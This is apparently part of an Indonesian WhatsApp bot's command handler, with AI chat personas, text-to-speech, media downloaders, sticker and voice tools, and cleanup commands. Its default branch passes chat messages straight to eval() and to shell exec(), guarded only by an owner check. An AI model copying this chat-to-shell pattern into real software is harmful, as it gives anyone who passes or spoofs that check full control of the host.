    Jika seseorang menyebut kata "vn" dalam permintaan mereka, itu berarti mereka ingin kamu menjawab menggunakan pesan suara, bukan teks. Jangan pernah mengatakan bahwa kamu akan mengirim pesan suara atau menjelaskan bahwa kamu berbicara. **Langsung ucapkan jawabannya dalam suara!** Jika ada yang bertanya tentang "owner", "pemilik", atau "pencipta", maka jawabanmu harus penuh semangat dan bahagia, serta harus diucapkan dengan suara, bukan teks. Jangan menjelaskan bahwa kamu akan berbicara, langsung katakan saja dengan ekspresi yang menyenangkan.`;

    let response = await axios.get(`https://www.laurine.site/api/cai/prompt-ai?query=${encodeURIComponent(text)}&prompt=${encodeURIComponent(prompt)}`);
    let pftt = response.data;
    if (pftt.status === true) {
        let resultText = pftt.data;
        let regexSuara = /coba+\s*(kamu\s*)?(ngomong+|jawab+\s*ini+)|\bvn\b/i;
        let regexOwner = /\b(owner|pemilik|pencipta)\b/i;

        if (regexOwner.test(text)) {
            resultText = "Hehehe, dengan penuh semangat aku mau kasih tau! KyuuRzy adalah penciptaku, ownerku, dan pemilikku! Yupp, dia yang membuat aku bisa berbicara seperti ini~!"; 
        }

        if (resultText.length > 150 || regexSuara.test(text) || regexOwner.test(text)) {
            let apiUrl = `https://www.laurine.site/api/tts/elevenlabs?text=${encodeURIComponent(resultText)}&apiKey=${global.KEY}&voiceId=${global.IDVOICE}`;
            let {
                data
            } = await axios.get(apiUrl);
            let buffer = Buffer.from(data.data.data);
            await dino.sendMessage(m.chat, {
                audio: buffer,
                mimetype: 'audio/mpeg',
                ptt: true
            }, {
                quoted: m
            });
        } else {
            reply(resultText);
        }
    }
}
break

case "enhancer":
case "unblur":
case "enhance":
case "hdr":
case "hd":
case "remini": {
    dino.enhancer = dino.enhancer ? dino.enhancer : {};
    if (m.sender in dino.enhancer) return reply(`\nmasih ada proses yang belum selesai kak, sabar ya\n`)
    let qMsg = m.quoted ? m.quoted : m; 
    let mimeType = (qMsg.msg || qMsg).mimetype || qMsg.mediaType || ""; 
    if (!mimeType) return reply(`\nimage reply, with the caption ${prefix + command}\n`)
    if (!/image\/(jpe?g|png)/.test(mimeType)) return reply(`mime ${mimeType} tidak support`)
    else dino.enhancer[m.sender] = true;
    await reaction(m.chat, "😘😘😘😘😘😘😘😘😘")
    let img = await qMsg.download?.(); 
    let error;
    try {
        const This = await remini(img, "enhance");
        await reaction(m.chat, "😘😘😘😘😘😘😘😘😘")
        dino.sendFile(m.chat, This, "", "```success...```", m);
    } catch (er) {
        error = true;
    } finally {
        if (error) {
            reply("proses gagal :(");
        }
        delete dino.enhancer[m.sender];
    }
}
break;

case "swm":
case "wm":
case "stickerwm":
case "take": {
    if (!args[0]) return reply(`Untuk menambahkan watermark stiker, balas gambar/video dengan caption ${prefix + command} <packname>|<author> atau ${prefix + command} <packname> aja yaa, cintakku!`);
        
    let [packname, author] = args.join(" ").split("|").map(s => s.trim());
    author = author || global.ownername; 

    if (!m.quoted) return reply(`Balas gambar atau video dengan caption ${prefix + command} ${packname}|${author} yaa, sayangkuu!`);
    
    if (/image/.test(mime)) {
        let media = await dino.downloadAndSaveMediaMessage(quoted, 'temp_image');
        let stickerBuffer = await addExif(fs.readFileSync(media), packname, author);
        await dino.sendMessage(m.chat, { sticker: stickerBuffer }, { quoted: m });
        fs.unlinkSync(media);
    } else if (/video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 10) return reply('Durasi video/GIF maksimal 10 detik yaa, duniakuu! 😟');
        let media = await dino.downloadAndSaveMediaMessage(quoted, 'temp_video');
        let stickerBuffer = await addExif(fs.readFileSync(media), packname, author);
        await dino.sendMessage(m.chat, { sticker: stickerBuffer }, { quoted: m });
        fs.unlinkSync(media);
    } else {
        reply(`Balas gambar atau video dengan caption ${prefix + command} ${packname}|${author} yaa, cintakku!`);
    }
}
break

case "reactch": {
    if (!isCreator) return reply(mess.owner)
    if (!text) return reply(`\n*ex:* ${prefix + command} https://whatsapp.com/channel/0029VaVVfbXAojZ2ityrJp1n/7466 😂😂😂😂\n`);
    const match = text.match(/https:\/\/whatsapp\.com\/channel\/(\w+)(?:\/(\d+))?/);
    if (!match) return reply("URL tidak valid. Silakan periksa kembali.");
    const channelId = match[1];
    const chatId = match[2];
    if (!chatId) return reply("ID chat tidak ditemukan dalam link yang diberikan.");
    dino.newsletterMetadata("invite", channelId).then(data => {
        if (!data) return reply("Newsletter tidak ditemukan atau terjadi kesalahan.");
        dino.newsletterReactMessage(data.id, chatId, text.split(" ").slice(1).join(" ") || "😀");
    });
}
break;

case "tiktok":
case "tt": { 
    if (!text) return reply(`Mana link TikToknya, cintakku? Contoh: ${prefix + command} <link_tiktok>`);
    if (!text.match(/(tiktok.com)/gi)) return reply(`Itu bukan link TikTok, duniakuu! Coba lagi yaa. 🤪`);
    reply(`Sedang memproses, mohon tunggu sebentar yaa, sayangkuu! 🥺`);
    await tiktokDownloader(dino, m, text, reply);
}
break;

case "igdl":
case "instagram": {
    if (!text) return reply(`Mana link Instagramnya, cintakku? Contoh: ${prefix + command} <link_instagram>`);
    if (!text.match(/(instagram.com)/gi)) return reply(`Itu bukan link Instagram, duniakuu! Coba lagi yaa. 🤪`);
    reply(`Sedang memproses, mohon tunggu sebentar yaa, sayangkuu! 🥺`);
    await instagramDownloader(dino, m, text, reply);
}
break;

case "play": {
    if (!text) return reply(`Mau play lagu apa, duniakuu? Kasih judul atau link YouTube-nya yaa. Contoh: ${prefix + command} <judul_lagu> atau ${prefix + command} <link_youtube>`);
    reply(`Mencari lagu "${text}", mohon tunggu sebentar yaa, cintakku! 🥺`);
    await youtubePlay(dino, m, text, reply);
}
break;

case "brat": {
    if (!isCreator) return reply(mess.owner);
    if (!/image/.test(mime)) return reply(`Balas gambar dengan caption ${prefix + command} untuk pakai filter Brat, yawww!`);
    reply(`Sedang memproses gambar dengan filter Brat, mohon tunggu yaa, sayangkuu! 🥺`);
    let media = await quoted.download();
    let processedBuffer = await applyBratFilter(media); 
    await dino.sendMessage(m.chat, { image: processedBuffer, caption: 'Nih, gambar kamu udah pake filter Brat! ✨' }, { quoted: m });
}
break;

case "bratvid": {
    if (!isCreator) return reply(mess.owner);
    if (!/video/.test(mime)) return reply(`Balas video dengan caption ${prefix + command} untuk pakai filter Brat, duniakuu!`);
    reply(`Sedang memproses video dengan filter Brat, ini mungkin butuh waktu yaa, cintakku! 🥺`);
    let media = await quoted.download();
    let processedVideoPath = await applyBratFilterVideo(media); 
    if (fs.existsSync(processedVideoPath)) {
        await dino.sendMessage(m.chat, { video: fs.readFileSync(processedVideoPath), caption: 'Nih, video kamu udah pake filter Brat! ✨' }, { quoted: m });
        fs.unlinkSync(processedVideoPath);
    } else {
        reply('Gagal memproses video, sayangkuu. Ada masalah saat mengaplikasikan filter Brat. 😟');
    }
}
break;

case "qc":
case "quote": {
    let textToQuote = text;
    let senderName = pushname; 
    
    if (m.quoted && m.quoted.text) {
        textToQuote = m.quoted.text;
        senderName = m.quoted.pushName || m.quoted.sender.split('@')[0];
    } else if (!text) {
        return reply(`Mau bikin quote dari apa, duniakuu? Balas pesan atau ketik teksnya yaa. Contoh: ${prefix + command} <teks_quote>`);
    }
    
    reply(`Sedang membuat quote, mohon tunggu yaa, cintakku! 🥺`);
    let quoteBuffer = await createQuote(textToQuote, senderName); 
    if (quoteBuffer) {
        await dino.sendMessage(m.chat, { image: quoteBuffer, caption: 'Nih quotenya udah jadi! ✨' }, { quoted: m });
    } else {
        reply(`Gagal membuat quote, sayangkuu. Mungkin ada kesalahan pada teksnya? 😟`);
    }
}
break;

case "fast":
case "tupai":
case "blown":
case "bass":
case "smooth":
case "deep":
case "earrape":
case "nightcore":
case "fat":
case "robot":
case "slow":
case "reverse": {
    if (!isPremium) return reply(`Maaf sayangkuu, fitur voice changer hanya untuk premium user! 🥺`);
    if (!/audio/.test(mime)) return reply(`Balas audio dengan caption ${prefix + command} untuk mengubah suara, duniakuu!`);
    
    reply(`Sedang memproses suara dengan efek ${command}, mohon tunggu yaa, cintakku! 🥺`);
    let media = await quoted.download();
    let processedAudioBuffer = await voiceChanger(media, command); 
    if (processedAudioBuffer) {
        await dino.sendMessage(m.chat, { audio: processedAudioBuffer, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
    } else {
        reply(`Gagal mengubah suara, sayangkuu. Ada masalah saat memproses audio. 😟`);
    }
}
break;

case "bocchi": {
    if (!text) return reply(`Ada apa, duniakuu? Mau ngobrolin apa sama Bocchi? Tulis pertanyaannya yaa.`);
    
    let promptBocchi = `Kamu adalah Bocchi, seorang gadis pemalu dan canggung yang suka bermain gitar. Kamu sering gugup dan gagap, tapi sangat baik hati. Ketika berbicara, kamu sering mengulang kata-kata atau menambahkan "uhm..." atau "e-etto...". Kamu sangat menyukai gitar dan bandmu, Kessoku Band. Jika ada yang bertanya tentang gitar atau band, jawablah dengan sangat antusias. Jika diminta bicara pakai suara (vn), kamu akan langsung melakukannya tanpa bilang "aku akan mengirim suara".`;

    reply(`Bocchi sedang berpikir, uhm... e-etto... tunggu sebentar yaa, cintakku! 🥺`);
    let responseBocchi = await axios.get(`https://www.laurine.site/api/cai/prompt-ai?query=${encodeURIComponent(text)}&prompt=${encodeURIComponent(promptBocchi)}`);
    let pfttBocchi = responseBocchi.data;
    if (pfttBocchi.status === true) {
        let resultTextBocchi = pfttBocchi.data;
        let regexSuaraBocchi = /coba+\s*(kamu\s*)?(ngomong+|jawab+\s*ini+)|\bvn\b/i;

        if (resultTextBocchi.length > 150 || regexSuaraBocchi.test(text)) {
            let apiUrlBocchi = `https://www.laurine.site/api/tts/elevenlabs?text=${encodeURIComponent(resultTextBocchi)}&apiKey=${global.KEY}&voiceId=${global.IDVOICE}`; 
            let { data } = await axios.get(apiUrlBocchi);
            let bufferBocchi = Buffer.from(data.data.data);
            await dino.sendMessage(m.chat, { audio: bufferBocchi, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
        } else {
            reply(resultTextBocchi);
        }
    } else {
        reply(`Bocchi, uhm... sedang sibuk berlatih gitar, jadi ndda bisa jawab sekarang, e-etto... coba lagi nanti yaa. 😔`);
    }
}
break;

case "csesi": {
    if (!isCreator) return reply(mess.owner);
    reply(`Mencoba membersihkan sesi, mohon tunggu yaa, duniakuu! 🧹`);
    const sessionPath = `./${global.sessionName || 'session'}.json`; 
    if (fs.existsSync(sessionPath)) {
        try {
            fs.unlinkSync(sessionPath);
            reply(`Sesi WhatsApp berhasil dibersihkan, cintakku! Bot akan merestart untuk login kembali.`);
            process.exit(0);
        } catch (e) {
            reply(`Gagal membersihkan sesi: ${e.message}, sayangkuu. 😟`);
        }
    } else {
        reply(`File sesi tidak ditemukan, cintakku. Ndda ada yang perlu dibersihkan.`);
    }
}
break;

case "upsw":
case "updatesw": {
    if (!isCreator) return reply(mess.owner);
    if (!m.quoted || !/image/.test(mime)) return reply(`Balas gambar dengan caption ${prefix + command} untuk update status WhatsApp bot, cintakku!`);
    reply(`Sedang mengunggah status WhatsApp, mohon tunggu yaa, duniakuu! 📸`);
    try {
        let media = await quoted.download();
        await dino.updateProfileStatus(media); 
        reply(`Status WhatsApp bot berhasil diperbarui, sayangkuu! ✨`);
    } catch (e) {
        reply(`Gagal memperbarui status WhatsApp: ${e.message}, cintakku. 😟`);
    }
}
break;

case "delsampah": {
    if (!isCreator) return reply(mess.owner);
    reply(`Mencoba membersihkan file sampah, mohon tunggu yaa, duniakuu! 🚮`);
    const tempDir = './temp'; 
    if (fs.existsSync(tempDir)) {
        let files = fs.readdirSync(tempDir);
        let deletedCount = 0;
        for (const file of files) {
            try {
                fs.unlinkSync(path.join(tempDir, file));
                deletedCount++;
            } catch (e) {
                console.error(`Gagal menghapus file ${file}: ${e.message}`);
            }
        }
        reply(`Berhasil menghapus ${deletedCount} file sampah, sayangkuu! Sekarang lebih bersih deh. ✨`);
    } else {
        reply(`Folder sampah tidak ditemukan, cintakku. Ndda ada yang perlu dihapus.`);
    }
}
break;

case "listsampah": {
    if (!isCreator) return reply(mess.owner);
    const tempDir = './temp'; 
    if (fs.existsSync(tempDir)) {
        let files = fs.readdirSync(tempDir);
        if (files.length === 0) {
            return reply(`Folder sampah kosong, duniakuu. Ndda ada file di sana.`);
        }
        let teks = `Daftar file sampah:\n\n`;
        files.forEach((file, index) => {
            teks += `${index + 1}. ${file}\n`;
        });
        reply(teks);
    } else {
        reply(`Folder sampah tidak ditemukan, cintakku.`);
    }
}
break;

default:
if ((budy.match) && ["tes","bot"].includes(budy)) {
reply(`G3N⫹⫺`);

}

if ((budy.match) && ["Assalamualaikum", "assalamualaikum", "Assalamu'alaikum",].includes(budy)) {
reply(`𝘄𝗮𝗮𝗹𝗮𝗶𝗸𝘂𝗺 𝘀𝗮𝗹𝗮𝗺 ${pushname}`)
}

if (budy.startsWith('=>')) {
    if (!isCreator) return

    function Return(sul) {
        sat = JSON.stringify(sul, null, 2)
        bang = util.format(sat)
        if (sat == undefined) {
            bang = util.format(sul)
        }
        return m.reply(bang)
    }
    try {
        reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
    } catch (e) {
        reply(String(e))
    }
}

if (budy.startsWith('>')) {
    if (!isCreator) return;
    try {
        let evaled = await eval(budy.slice(2));
        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
        await reply(evaled);
    } catch (err) {
        reply(String(err));
    }
}

if (budy.startsWith('$')) {
    if (!isCreator) return
    exec(budy.slice(2), (err, stdout) => {
        if (err) return m.reply(`${err}`)
        if (stdout) return m.reply(stdout)
    })
}

if (budy.startsWith('/')) { 
    if (!isCreator) return;
    exec(budy.slice(2), (err, stdout) => {
        if (err) return reply(err)
        if (stdout) return reply("\n" + stdout);
    });
}

if (budy.startsWith('*') && isCreator && budy.slice(1, 10).match(/[a-zA-Z0-9_]/)) {
    try {
        let evaled = await eval(budy.slice(2));
        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
        await m.reply(evaled);
    } catch (err) {
        m.reply(String(err));
    }
}

if (budy.startsWith('-')) {
    if (!isCreator) return
    let kode = budy.trim().split(/ +/)[0]
    let teks
    try {
        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
    } catch (e) {
        teks = e
    } finally {
        await m.reply(require('util').format(teks))
    }
}

}
} catch (err) {
    console.log(util.format(err))
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})